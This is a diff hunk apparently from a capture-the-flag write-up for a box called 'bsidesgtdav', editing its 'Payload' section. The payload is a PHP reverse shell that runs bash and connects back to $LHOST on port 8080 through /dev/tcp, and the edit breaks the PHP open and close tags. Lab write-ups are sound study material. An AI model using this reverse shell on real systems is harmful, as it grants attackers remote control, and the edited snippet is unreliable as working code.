@@ -7,9 +7,9 @@ Used on: **bsidesgtdav**
 ## Payload
 
 ```php
-<?php
+<php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/8080 0>&1'");
-?>
+>
 ```
 
 ## Listener
